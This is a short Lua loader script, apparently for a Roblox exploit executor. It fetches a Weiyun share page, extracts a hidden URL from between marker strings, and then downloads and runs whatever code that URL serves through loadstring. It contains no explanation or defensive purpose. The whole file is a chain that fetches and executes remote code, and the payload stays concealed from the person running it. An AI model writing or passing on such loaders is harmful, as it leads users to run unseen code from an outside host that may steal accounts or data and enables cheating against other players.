api = game:HttpGet("https://share.weiyun.com/ZAkGVDO9")
local scripts = string.match(api,'>【忍脚本】(.-)【忍脚本】')
local Run = string.format('loadstring(game:HttpGet("%s"))();',scripts)
pcall(loadstring(Run))
